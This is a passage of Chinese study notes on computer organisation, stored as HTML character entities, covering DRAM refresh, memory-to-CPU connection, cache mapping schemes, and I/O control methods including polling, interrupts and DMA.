&#x96C6;&#x4E2D;&#x5237;&#x65B0;&#x2013;&#x5728;&#x89C4;&#x5B9A;&#x7684;&#x4E00;&#x4E2A;&#x5237;&#x65B0;&#x5468;&#x671F;&#x5185;&#xFF0C;&#x5BF9;&#x5168;&#x90E8;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x96C6;&#x4E2D;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x9010;&#x884C;&#x8FDB;&#x884C;&#x5237;&#x65B0;&#xFF0C;&#x6B64;&#x523B;&#x5FC5;&#x987B;&#x505C;&#x6B62;&#x8BFB;/&#x5199;&#x64CD;&#x4F5C;&#x3002;&#x4E4B;&#x540E;&#x5269;&#x4F59;&#x7684;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x6216;&#x7EF4;&#x6301;&#x4FE1;&#x606F;&#x3002;&#x56E0;&#x6B64;&#x5B58;&#x5728;&#x201C;&#x6B7B;&#x65F6;&#x95F4;&#x201D;&#x6216;&#x8BBF;&#x5B58;&#x201C;&#x6B7B;&#x533A;&#x201D;&#x3002; &#x5206;&#x6563;&#x5237;&#x65B0;&#x2013;&#x5BF9;&#x6BCF;&#x884C;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x7684;&#x5237;&#x65B0;&#x5206;&#x6563;&#x5230;&#x6BCF;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x5185;&#x5B8C;&#x6210;&#x3002;&#x5176;&#x4E2D;&#x628A;&#x673A;&#x5668;&#x7684;&#x5468;&#x671F;tctc&#x5206;&#x6210;&#x4E24;&#x6BB5;&#xFF0C;&#x524D;&#x534A;&#x6BB5;tMtM&#x7528;&#x6765;&#x8BFB;&#x5199;&#x6216;&#x7EF4;&#x6301;&#x4FE1;&#x606F;&#xFF0C;&#x540E;&#x534A;&#x6BB5;tRtR&#x7528;&#x6765;&#x5237;&#x65B0;,&#x4E0D;&#x5B58;&#x5728;&#x6B7B;&#x65F6;&#x95F4;&#xFF0C;&#x4F46;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x957F; &#x5F02;&#x6B65;&#x5237;&#x65B0;&#x2013;&#x5F02;&#x6B65;&#x5237;&#x65B0;&#x4E3A;&#x524D;&#x4E24;&#x79CD;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x65E2;&#x53EF;&#x4EE5;&#x7F29;&#x77ED;&#x6B7B;&#x65F6;&#x95F4;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5145;&#x5206;&#x5229;&#x7528;2ms&#x7684;&#x7279;&#x70B9; &#x52A8;&#x6001;RAM&#x548C;&#x9759;&#x6001;RAM&#x7684;&#x6BD4;&#x8F83; &#x5728;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x82AF;&#x7247;&#x4E2D;&#xFF0C;&#x52A8;&#x6001;RAM&#x7684;&#x96C6;&#x6210;&#x5EA6;&#x8FDC;&#x9AD8;&#x4E8E;&#x9759;&#x6001;RAM&#x3002; &#x52A8;&#x6001;RAM&#x884C;&#x3001;&#x5217;&#x5730;&#x5740;&#x6309;&#x5148;&#x540E;&#x987A;&#x5E8F;&#x8F93;&#x9001;&#xFF0C;&#x51CF;&#x5C11;&#x4E86;&#x82AF;&#x7247;&#x7684;&#x5F15;&#x811A;&#xFF0C;&#x5C01;&#x88C5;&#x5C3A;&#x5BF8;&#x4E5F;&#x51CF;&#x5C11; &#x52A8;&#x6001;RAM&#x7684;&#x529F;&#x8017;&#x6BD4;&#x9759;&#x6001;RAM&#x5C0F; &#x52A8;&#x6001;RAM&#x7684;&#x4EF7;&#x683C;&#x6BD4;&#x9759;&#x6001;RAM&#x7684;&#x4EF7;&#x683C;&#x4FBF;&#x5B9C; &#x7531;&#x4E8E;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x5143;&#x4EF6;(&#x7535;&#x5BB9;)&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x901F;&#x5EA6;&#x6BD4;&#x9759;&#x6001;RAM&#x4F4E; &#x52A8;&#x6001;RAM&#x9700;&#x8981;&#x518D;&#x751F;&#xFF0C;&#x6545;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x518D;&#x751F;&#x7535;&#x8DEF;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x6D88;&#x8017;&#x4E00;&#x90E8;&#x5206;&#x529F;&#x7387;&#x3002;&#x901A;&#x5E38;&#xFF0C;&#x5BB9;&#x91CF;&#x4E0D;&#x5927;&#x7684;&#x9AD8;&#x901F;&#x7F13;&#x5B58;&#x5668;&#x5927;&#x591A;&#x7528;&#x9759;&#x6001;RAM&#x5B9E;&#x73B0; &#x5B58;&#x50A8;&#x5668;&#x4E0E;CPU&#x7684;&#x8FDE;&#x63A5; &#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x7684;&#x6269;&#x5C55; &#x4F4D;&#x6269;&#x5C55;&#x2013;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F; &#x5B57;&#x6269;&#x5C55;&#x2013;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5668;&#x5B57;&#x7684;&#x6570;&#x91CF; &#x5B57;&#x3001;&#x4F4D;&#x6269;&#x5C55;&#x2013;&#x65E2;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x53C8;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F; &#x5B58;&#x50A8;&#x5668;&#x4E0E;CPU&#x8FDE;&#x63A5; &#x5730;&#x5740;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;CPU&#x7684;&#x5730;&#x5740;&#x7EBF;&#x5F80;&#x5F80;&#x6BD4;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7684;&#x5730;&#x5740;&#x7EBF;&#x6570;&#x591A;&#xFF0C;&#x901A;&#x5E38;&#x603B;&#x662F;&#x5C06;CPU&#x5730;&#x5740;&#x7EBF;&#x7684;&#x4F4E;&#x4F4D;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x82AF;&#x7247;&#x7684;&#x5730;&#x5740;&#x7EBF;&#x76F8;&#x8FDE;&#xFF0C;CPU&#x5730;&#x5740;&#x7EBF;&#x7684;&#x9AD8;&#x4F4D;&#x6216;&#x5728;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7684;&#x6269;&#x5145;&#x65F6;&#x7528;&#xFF0C;&#x6216;&#x4F5C;&#x5176;&#x4ED6;&#x7528;&#x9014;&#x3002; &#x6570;&#x636E;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;CPU&#x7684;&#x6570;&#x636E;&#x7EBF;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x4E5F;&#x4E0D;&#x7B49;&#xFF0C;&#x56E0;&#x6B64;&#x5FC5;&#x987B;&#x5BF9;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x6269;&#x4F4D;&#x4F7F;&#x5176;&#x76F8;&#x7B49; &#x7247;&#x9009;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;&#x662F;CPU&#x4E0E;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x6B63;&#x786E;&#x5DE5;&#x4F5C;&#x7684;&#x5173;&#x952E; &#x5408;&#x7406;&#x9009;&#x62E9;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x2013;&#x6307;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7C7B;&#x578B;(RAM&#x6216;ROM)&#x548C;&#x6570;&#x91CF;&#x7684;&#x9009;&#x62E9;&#x3002;&#x901A;&#x5E38;&#x7528;ROM&#x5B58;&#x653E;&#x7A0B;&#x5E8F;&#xFF0C;&#x6807;&#x51C6;&#x5B50;&#x7A0B;&#x5E8F;&#x548C;&#x5404;&#x7C7B;&#x5E38;&#x6570;&#x7B49;&#x3002;RAM&#x4E3A;&#x7528;&#x6237;&#x7F16;&#x7A0B;&#x8BBE;&#x8BA1;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5C3D;&#x91CF;&#x9009;&#x62E9;&#x8FDE;&#x7EBF;&#x7B80;&#x5355;&#x65B9;&#x4FBF;&#x3002; &#x63D0;&#x9AD8;&#x8BBF;&#x5B58;&#x901F;&#x5EA6;&#x7684;&#x63AA;&#x65BD; &#x5355;&#x4F53;&#x591A;&#x5B57;&#x7CFB;&#x7EDF;&#x2013;&#x5728;&#x4E00;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x5185;&#xFF0C;&#x4ECE;&#x540C;&#x4E00;&#x5730;&#x5740;&#x53D6;&#x51FA;4&#x6761;&#x6307;&#x4EE4;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x9010;&#x6761;&#x9001;&#x81F3;CPU&#x6267;&#x884C;&#x3002;&#x589E;&#x5927;&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;&#xFF0C;&#x63D0;&#x9AD8;&#x5B58;&#x50A8;&#x5668;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x3002;&#x524D;&#x63D0;&#x662F;&#xFF0C;&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x5728;&#x4E3B;&#x5B58;&#x5185;&#x5FC5;&#x987B;&#x662F;&#x8FDE;&#x7EED;&#x5B58;&#x653E;&#x3002; &#x591A;&#x4F53;&#x5E76;&#x884C;&#x7CFB;&#x7EDF;&#x2013;&#x91C7;&#x7528;&#x591A;&#x63D0;&#x6A21;&#x5757;&#x7EC4;&#x6210;&#x7684;&#x5B58;&#x50A8;&#x5668;&#xFF0C;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x5BB9;&#x91CF;&#x548C;&#x5B58;&#x53D6;&#x901F;&#x5EA6;&#xFF0C;&#x5404;&#x81EA;&#x5177;&#x6709;&#x72EC;&#x7ACB;&#x7684;&#x5BC4;&#x5B58;&#x5668;(MAR)&#xFF0C;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;(MDR)&#xFF0C;&#x5730;&#x5740;&#x8BD1;&#x7801;&#xFF0C;&#x9A71;&#x52A8;&#x7535;&#x8DEF;&#x548C;&#x8BFB;&#x5199;&#x7535;&#x8DEF;&#x3002; &#x9AD8;&#x4F4D;&#x4EA4;&#x53C9;&#x7F16;&#x5740;&#x7684;&#x591A;&#x4F53;&#x5B58;&#x50A8;&#x5668; &#x4F4E;&#x4F4D;&#x4EA4;&#x53C9;&#x7F16;&#x5740;&#x7684;&#x591A;&#x4F53;&#x5B58;&#x50A8;&#x5668; &#x9AD8;&#x901F;&#x7F13;&#x51B2;&#x5B58;&#x50A8;&#x5668; Cache&#x7684;&#x57FA;&#x672C;&#x7ED3;&#x6784; &#x5730;&#x5740;&#x6620;&#x5C04;&#x53D8;&#x6362;&#x673A;&#x6784;&#x2013;&#x5C06;CPU&#x9001;&#x6765;&#x7684;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x4E3A;Cache&#x5730;&#x5740;&#x3002; Cache&#x2013;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x6620;&#x5C04; &#x76F4;&#x63A5;&#x6620;&#x5C04; &#x4F18;&#x70B9;&#xFF1A;&#x5B9E;&#x73B0;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x7684;&#x67D0;&#x4E9B;&#x4F4D;&#x76F4;&#x63A5;&#x5224;&#x65AD;&#xFF0C;&#x5373;&#x53EF;&#x786E;&#x5B9A;&#x6240;&#x9700;&#x5B57;&#x5757;&#x662F;&#x5426;&#x5728;&#x7F13;&#x5B58;&#x4E2D; &#x7F3A;&#x70B9;&#xFF1A;&#x4E0D;&#x591F;&#x7075;&#x6D3B;&#xFF0C;&#x6BCF;&#x4E2A;&#x4E3B;&#x5B58;&#x5FEB;&#x53EA;&#x80FD;&#x56FA;&#x5B9A;&#x7684;&#x5BF9;&#x5E94;&#x67D0;&#x4E2A;&#x7F13;&#x5B58;&#x5757;&#xFF0C;&#x5373;&#x4F7F;&#x7F13;&#x5B58;&#x5185;&#x8FD8;&#x7A7A;&#x7740;&#x8BB8;&#x591A;&#x4F4D;&#x7F6E;&#x4E5F;&#x4E0D;&#x80FD;&#x88AB;&#x5360;&#x7528;&#xFF0C;&#x4F7F;&#x7F13;&#x5B58;&#x7684;&#x7A7A;&#x95F4;&#x5F97;&#x4E0D;&#x5230;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x6070;&#x597D;&#x91CD;&#x590D;&#x8BBF;&#x95EE;&#x5BF9;&#x5E94;&#x540C;&#x4E00;&#x7F13;&#x5B58;&#x4F4D;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x5B58;&#x5757;&#xFF0C;&#x5C31;&#x8981;&#x4E0D;&#x505C;&#x7684;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#xFF0C;&#x964D;&#x4F4E;&#x547D;&#x4E2D;&#x7387;&#x3002; &#x5168;&#x76F8;&#x8054;&#x6620;&#x5C04;&#x2013;&#x5141;&#x8BB8;&#x4E3B;&#x5B58;&#x4E2D;&#x6BCF;&#x4E00;&#x5B57;&#x5757;&#x6620;&#x5C04;&#x5230;Cache&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x5757;&#x4F4D;&#x7F6E;&#x4E0A;&#x3002; &#x4F18;&#x70B9;&#xFF1A;&#x7075;&#x6D3B;&#xFF0C;&#x547D;&#x4E2D;&#x7387;&#x9AD8;&#xFF0C;&#x7F29;&#x5C0F;&#x4E86;&#x5FEB;&#x51B2;&#x7A81;&#x7387;&#x3002; &#x7F3A;&#x70B9;&#xFF1A;&#x6240;&#x9700;&#x7684;&#x903B;&#x8F91;&#x7535;&#x8DEF;&#x751A;&#x591A;&#xFF0C;&#x6210;&#x672C;&#x8F83;&#x9AD8;&#x3002; &#x7EC4;&#x76F8;&#x8054;&#x6620;&#x5C04; &#x4E94; &#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF; &#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x53D1;&#x5C55;&#x7684;&#x56DB;&#x4E2A;&#x9636;&#x6BB5; &#x65E9;&#x671F;&#x9636;&#x6BB5; &#x5206;&#x6563;&#x8FDE;&#x63A5; CPU&#x548C;I/O&#x8BBE;&#x5907; &#x4E32;&#x884C;&#x5DE5;&#x4F5C; &#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F; &#x63A5;&#x53E3;&#x6A21;&#x5757;&#x548C;DMA&#x9636;&#x6BB5; &#x603B;&#x7EBF;&#x8FDE;&#x63A5; CPU&#x548C;I/O&#x8BBE;&#x5907;&#x5E76;&#x884C;&#x5DE5;&#x4F5C; &#x5177;&#x6709;&#x901A;&#x9053;&#x7ED3;&#x6784;&#x7684;&#x9636;&#x6BB5; &#x5177;&#x6709;I/O&#x5904;&#x7406;&#x673A;&#x7684;&#x9636;&#x6BB5; &#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x7684;&#x7EC4;&#x6210; 1.I/O&#x8F6F;&#x4EF6; I/O&#x6307;&#x4EE4; CPU&#x6307;&#x4EE4;&#x7684;&#x4E00;&#x90E8;&#x5206; | &#x64CD;&#x4F5C;&#x7801; | &#x547D;&#x4EE4;&#x7801; | &#x8BBE;&#x5907;&#x7801; | &#x901A;&#x9053;&#x6307;&#x4EE4;&#xFF1A;&#x901A;&#x9053;&#x81EA;&#x8EAB;&#x7684;&#x6307;&#x4EE4; &#x6307;&#x660E;&#x6570;&#x7EC4;&#x7684;&#x9996;&#x5730;&#x5740;&#x3001;&#x4F20;&#x9001;&#x5B57;&#x6570;&#x3001;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x3002; I/O&#x786C;&#x4EF6; &#x8BBE;&#x5907; I/O&#x63A5;&#x53E3; &#x8BBE;&#x5907; &#x8BBE;&#x5907;&#x63A7;&#x5236;&#x5668; &#x901A;&#x9053; I/O&#x8BBE;&#x5907;&#x4E0E;&#x4E3B;&#x673A;&#x7684;&#x8054;&#x7CFB;&#x65B9;&#x5F0F; I/O&#x8BBE;&#x5907;&#x7F16;&#x5740;&#x65B9;&#x5F0F; &#x7EDF;&#x4E00;&#x7F16;&#x5740; &#x7528;&#x53D6;&#x6570;&#x5B58;&#x6570;&#x6307;&#x4EE4; &#x4E0D;&#x7EDF;&#x4E00;&#x7F16;&#x5740; &#x6709;&#x4E13;&#x95E8;&#x7684;I/O&#x6307;&#x4EE4; &#x8BBE;&#x5907;&#x5BFB;&#x5740; &#x7528;&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7535;&#x8DEF;&#x8BC6;&#x522B;&#x662F;&#x5426;&#x88AB;&#x9009;&#x4E2D; &#x4F20;&#x9001;&#x65B9;&#x5F0F; &#x4E32;&#x884C; &#x5E76;&#x884C; &#x8054;&#x7EDC;&#x65B9;&#x5F0F; &#x7ACB;&#x5373;&#x54CD;&#x5E94;&#x65B9;&#x5F0F; &#x5F02;&#x6B65;&#x65B9;&#x5F0F;&#x91C7;&#x7528;&#x5E94;&#x7B54;&#x4FE1;&#x53F7; &#x540C;&#x6B65;&#x5DE5;&#x4F5C;&#x91C7;&#x7528;&#x540C;&#x6B65;&#x65F6;&#x6807;&#x8054;&#x7EDC; I/O&#x8BBE;&#x5907; &#x8F90;&#x5C04;&#x5F0F;&#x8FDE;&#x63A5; &#x603B;&#x7EBF;&#x5F0F;&#x8FDE;&#x63A5; I/O&#x8BBE;&#x5907;&#x4E0E;&#x4E3B;&#x673A;&#x4FE1;&#x606F;&#x4F20;&#x9001;&#x7684;&#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F; &#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F; &#x5018;&#x82E5;CPU&#x5728;&#x542F;&#x52A8;I/O&#x8BBE;&#x5907;&#x540E;&#xFF0C;&#x4E0D;&#x67E5;&#x8BE2;&#x8BBE;&#x5907;&#x662F;&#x5426;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x81EA;&#x8EAB;&#x7A0B;&#x5E8F;&#xFF0C;&#x53EA;&#x662F;&#x5F53;I/O&#x8BBE;&#x5907;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x5E76;&#x5411;CPU&#x53D1;&#x51FA;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x540E;&#x624D;&#x4E88;&#x4EE5;&#x54CD;&#x5E94;&#x3002; DMA&#x65B9;&#x5F0F;(&#x76F4;&#x63A5;&#x5B58;&#x50A8;&#x5668;&#x5B58;&#x53D6;) &#x4E3B;&#x5B58;&#x4E0E;I/O&#x8BBE;&#x5907;&#x4E4B;&#x95F4;&#x6709;&#x4E00;&#x6761;&#x6570;&#x636E;&#x901A;&#x8DEF;&#xFF0C;&#x4E3B;&#x5B58;&#x4E0E;I/O&#x8BBE;&#x5907;&#x4EA4;&#x6362;&#x4FE1;&#x606F;&#x65F6;&#xFF0C;&#x65E0;&#x987B;&#x8C03;&#x7528;&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x82E5;&#x51FA;&#x73B0;DMA&#x548C;CPU&#x540C;&#x65F6;&#x8BBF;&#x95EE;&#x4E3B;&#x5B58;&#xFF0C;CPU&#x603B;&#x662F;&#x5C06;&#x603B;&#x7EBF;&#x5360;&#x6709;&#x6743;&#x8BA9;&#x7ED9;DMA&#xFF0C;&#x901A;&#x5E38;&#x628A;DMA&#x8FD9;&#x79CD;&#x5360;&#x6709;&#x79F0;&#x4E3A;&#x7A83;&#x53D6;&#x6216;&#x632A;&#x7528;&#x3002;&#x7A83;&#x53D6;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x822C;&#x4E3A;&#x4E00;&#x4E2A;&#x5468;&#x671F;&#xFF0C;&#x6545;&#x53C8;&#x628A;DMA&#x5360;&#x7528;&#x7684;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x7A83;&#x53D6;&#x5468;&#x671F;&#x6216;&#x632A;&#x7528;&#x5468;&#x671F;&#x3002; I/O&#x63A5;&#x53E3; &#x4E3A;&#x4EC0;&#x4E48;&#x8BBE;&#x7F6E;I/O&#x63A5;&#x53E3; &#x5B9E;&#x73B0;&#x8BBE;&#x5907;&#x7684;&#x9009;&#x62E9; &#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x8FBE;&#x5230;&#x901F;&#x5EA6;&#x5339;&#x914D; &#x5B9E;&#x73B0;&#x6570;&#x636E;&#x4E32;&#x2013;&#x5E76;&#x683C;&#x5F0F;&#x8F6C;&#x6362; &#x5B9E;&#x73B0;&#x7535;&#x5E73;&#x8F6C;&#x6362; &#x5B9E;&#x73B0;&#x7535;&#x5E73;&#x8F6C;&#x6362; &#x4F20;&#x9001;&#x63A7;&#x5236;&#x547D;&#x4EE4; &#x53CD;&#x6620;&#x8BBE;&#x5907;&#x7684;&#x72B6;&#x6001;(&#x201C;&#x5FD9;&#x201D;,&#x201D;&#x5C31;&#x7EEA;&#x201D;,&#x201D;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x201D;) &#x7AEF;&#x53E3;&#x548C;&#x63A5;&#x53E3;&#x7684;&#x5173;&#x7CFB; &#x7AEF;&#x53E3;&#x662F;&#x6307;&#x63A5;&#x53E3;&#x7535;&#x8DEF;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x8FD9;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x63A7;&#x5236;&#x4FE1;&#x606F;&#x548C;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x7AEF;&#x53E3;&#x88AB;&#x5206;&#x522B;&#x79F0;&#x4E3A;&#x6570;&#x636E;&#x7AEF;&#x53E3;&#xFF0C;&#x63A7;&#x5236;&#x7AEF;&#x53E3;&#xFF0C;&#x548C;&#x72B6;&#x6001;&#x7AEF;&#x53E3;&#x3002;&#x82E5;&#x5E72;&#x4E2A;&#x7AEF;&#x53E3;&#x52A0;&#x4E0A;&#x76F8;&#x5E94;&#x7684;&#x63A7;&#x5236;&#x903B;&#x8F91;&#x624D;&#x80FD;&#x7EC4;&#x6210;&#x63A5;&#x53E3;&#x3002; &#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210; &#x603B;&#x7EBF;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#x7684;I/O&#x63A5;&#x53E3;&#x7535;&#x8DEF; &#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7EBF;&#xFF0C;&#x6570;&#x636E;&#x7EBF;&#xFF0C;&#x547D;&#x4EE4;&#x7EBF;&#xFF0C;&#x72B6;&#x6001;&#x7EBF; &#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210; &#x63A5;&#x53E3;&#x529F;&#x80FD; &#x63A5;&#x53E3;&#x7EC4;&#x6210; &#x9009;&#x5740;&#x529F;&#x80FD; &#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7535;&#x8DEF; &#x4F20;&#x9001;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD; &#x547D;&#x4EE4;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x547D;&#x4EE4;&#x8BD1;&#x7801;&#x5668; &#x4F20;&#x9001;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD; &#x6570;&#x636E;&#x7F13;&#x51B2;&#x5BC4;&#x5B58;&#x5668; &#x53CD;&#x6620;&#x8BBE;&#x5907;&#x72B6;&#x6001;&#x7684;&#x529F;&#x80FD; &#x8BBE;&#x5907;&#x6807;&#x8BB0;&#x72B6;&#x6001; &#x63A5;&#x53E3;&#x7C7B;&#x578B; &#x5206;&#x7C7B; &#x79CD;&#x7C7B; &#x6309;&#x6570;&#x636E;&#x4F20;&#x9001;&#x65B9;&#x5F0F; &#x5E76;&#x884C;&#x63A5;&#x53E3;(Intel 8255) &#x4E32;&#x884C;&#x63A5;&#x53E3;(Intel 8251) &#x6309;&#x529F;&#x80FD;&#x9009;&#x62E9;&#x7684;&#x7075;&#x6D3B;&#x6027; &#x53EF;&#x7F16;&#x7A0B;&#x63A5;&#x53E3;(Intel 8255,Intel 8251) &#x4E0D;&#x53EF;&#x7F16;&#x7A0B;&#x63A5;&#x53E3;(Intel 8212) &#x6309;&#x901A;&#x7528;&#x6027; &#x901A;&#x7528;&#x63A5;&#x53E3;(Intel 8255&#x3001; Intel 8251) &#x4E13;&#x7528;&#x63A5;&#x53E3;(Intel 8279&#x3001; Intel 8275) &#x6309;&#x6570;&#x636E;&#x4F20;&#x9001;&#x7684;&#x63A7;&#x5236;&#x65B9;&#x5F0F; &#x4E2D;&#x65AD;&#x63A5;&#x53E3;(Intel 8259) DMA&#x63A5;&#x53E3;(Intel 8257) &#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F; &#x6307;&#x4EE4; &#x4F5C;&#x7528; &#x6D4B;&#x8BD5;&#x6307;&#x4EE4; &#x7528;&#x6765;&#x67E5;&#x8BE2;I/O&#x8BBE;&#x5907;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA; &#x4F20;&#x9001;&#x6307;&#x4EE4; &#x5F53;I/O&#x8BBE;&#x5907;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x4F20;&#x9001;&#x6307;&#x4EE4; &#x8F6C;&#x79FB;&#x6307;&#x4EE4; &#x82E5;I/O&#x8BBE;&#x5907;&#x672A;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x6267;&#x884C;&#x8F6C;&#x79FB;&#x6307;&#x4EE4;&#xFF0C;&#x8F6C;&#x81F3;&#x6D4B;&#x8BD5;&#x6307;&#x4EE4;&#xFF0C;&#x7EE7;&#x7EED;&#x6D4B;&#x8BD5;I/O&#x8BBE;&#x5907;&#x7684;&#x72B6;&#x6001; &#x7A0B;&#x5E8F;&#x6D41;&#x7A0B; 1&#xFF09;CPU&#x53D1;I/O&#x5730;&#x5740;&#x8BBE;&#x5907;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;&#xFF1B;&#x5730;&#x5740;&#x603B;&#x7EBF;&#xF0AE;&#x63A5;&#x53E3;&#xF0AE;&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x5668;&#x8BD1;&#x7801;&#xF0AE;&#x9009;&#x4E2D;&#xF0AE;&#x53D1;SEL&#x4FE1;&#x53F7;&#xFF1B;2&#xFF09;CPU&#x53D1;&#x542F;&#x52A8;&#x547D;&#x4EE4;DBR&#xF0AE;&#x5F00;&#x547D;&#x4EE4;&#x63A5;&#x6536;&#x95E8;&#xFF1B;&#xF0AE;D&#x7F6E;0&#xFF0C;B&#x7F6E;1&#xF0AE;&#x63A5;&#x53E3;&#x5411;&#x8BBE;&#x5907;&#x53D1;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#xFF1B;3&#xFF09;CPU&#x7B49;&#x5F85;&#xFF0C;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x8BFB;&#x51FA;&#x6570;&#x636E;&#xFF1B;4&#xFF09;&#x5916;&#x8BBE;&#x5DE5;&#x4F5C;&#x5B8C;&#x6210;&#xFF0C;B&#x7F6E;0&#xFF0C;D&#x7F6E;1&#xFF1B;5&#xFF09;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x4FE1;&#x53F7;&#xF0AE;&#x63A5;&#x53E3;&#xF0AE;&#x5B8C;&#x6210;&#x4FE1;&#x53F7;&#xF0AE;&#x63A7;&#x5236;&#x603B;&#x7EBF;&#xF0AE;CPU&#xFF1B;6&#xFF09;&#x8F93;&#x5165;&#xFF1A;CPU&#x901A;&#x8FC7;&#x8F93;&#x5165;&#x6307;&#x4EE4;&#xFF08;IN&#xFF09;&#x5C06;DBR&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53D6;&#x8D70;&#x3002; &#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F; 